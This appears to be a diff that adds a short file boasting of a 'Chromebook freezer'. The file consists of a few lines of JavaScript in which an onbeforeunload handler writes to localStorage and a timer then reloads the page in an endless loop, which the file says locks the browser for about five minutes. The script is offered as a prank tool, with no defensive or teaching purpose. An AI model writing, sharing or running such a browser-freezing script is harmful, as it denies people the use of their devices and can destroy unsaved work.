@@ -1,0 +1,9 @@
+This isn't another chromebook crasher...
+ITS A CHROMEBOOK FREEZER!!!
+onbeforeunload = function(){localStorage.x=1};
+
+setTimeout(function(){
+  while(1)location.reload(1)
+}, 1000)
+
+(It will only freeze for 5 minutes).
